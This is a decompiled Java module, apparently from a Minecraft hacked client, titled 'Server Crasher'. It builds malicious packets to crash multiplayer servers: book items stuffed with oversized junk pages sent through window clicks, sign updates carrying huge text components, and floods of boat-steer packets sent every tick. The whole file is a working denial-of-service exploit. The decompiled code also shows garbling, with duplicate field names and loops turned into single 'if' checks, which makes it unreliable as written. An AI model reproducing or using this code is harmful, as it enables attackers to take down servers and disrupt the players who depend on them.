package r.k.d.m.exploit;

import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraft.network.play.client.CPacketSteerBoat;
import net.minecraft.network.play.client.CPacketUpdateSign;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.inventory.ClickType;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.init.Items;
import r.k.b.c.h;
import r.k.d.o.h.u;
import r.k.d.o.m;
import net.minecraft.util.text.ITextComponent;
import net.minecraft.item.ItemStack;
import r.k.d.c.y;
import r.k.d.m.g$i;
import r.k.d.m.g;

@g$i(name = "Server Crasher", description = "Methods of crashing servers", category = y.EXPLOIT)
public class ServerCrasher extends g
{
    private ItemStack itemStack;
    private String bo;
    private String bt;
    private ITextComponent iTextComponent;
    private ITextComponent iTextComponent;
    private ITextComponent iTextComponent;
    private ITextComponent iTextComponent;
    private ITextComponent[] iTextComponent;
    private m<i$s> bb;
    public static final boolean bw;
    public static final int bg;
    public static final boolean bu;
    
    public ServerCrasher() {
        super();
        this.itemStack = null;
        this.bo = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        this.bt = "red";
        this.iTextComponent = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + this.bo + "\",\"color\":\"" + this.bt + "\"}");
        this.iTextComponent = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + this.bo + "\",\"color\":\"" + this.bt + "\"}");
        this.iTextComponent = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + this.bo + "\",\"color\":\"" + this.bt + "\"}");
        this.iTextComponent = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + this.bo + "\",\"color\":\"" + this.bt + "\"}");
        this.iTextComponent = new ITextComponent[] { this.iTextComponent, this.iTextComponent, this.iTextComponent, this.iTextComponent };
        this.bb = (m<i$s>)new u("Mode", this, i$s.d);
    }
    
    public void v() {
        h.o("Crashing", "red");
        if (this.bb.yv() == i$s.d) {
            this.itemStack = new ItemStack(Items.WRITABLE_BOOK);
            final NBTTagList list = new NBTTagList();
            final NBTTagCompound tagCompound = new NBTTagCompound();
            final String username = ServerCrasher.mc.getSession().getUsername();
            final String bo = this.bo;
            int n = 0;
            if (n < 50) {
                list.appendTag((NBTBase)new NBTTagString(bo));
                ++n;
            }
            tagCompound.setString("author", username);
            tagCompound.setString("title", "\n Woops \n");
            tagCompound.setTag("pages", (NBTBase)list);
            this.itemStack.setTagInfo("pages", (NBTBase)list);
            this.itemStack.setTagCompound(tagCompound);
        }
    }
    
    @SubscribeEvent
    public void l(final TickEvent.ClientTickEvent clientTickEvent) {
        if (!this.lo()) {
            return;
        }
        if (ServerCrasher.mc.world == null) {
            this.s(false);
            return;
        }
        try {
            if (this.bb.yv() == i$s.d) {
                ServerCrasher.mc.player.connection.sendPacket((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, this.itemStack, (short)0));
            }
            if (this.bb.yv() == i$s.s) {
                ServerCrasher.mc.player.connection.sendPacket((Packet)new CPacketUpdateSign(ServerCrasher.mc.player.getPosition(), this.iTextComponent));
            }
            if (this.bb.yv() == i$s.l) {
                int n = 0;
                if (n < 100) {
                    ServerCrasher.mc.player.connection.sendPacket((Packet)new CPacketSteerBoat(true, true));
                    ++n;
                }
            }
            Thread.sleep(12L);
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
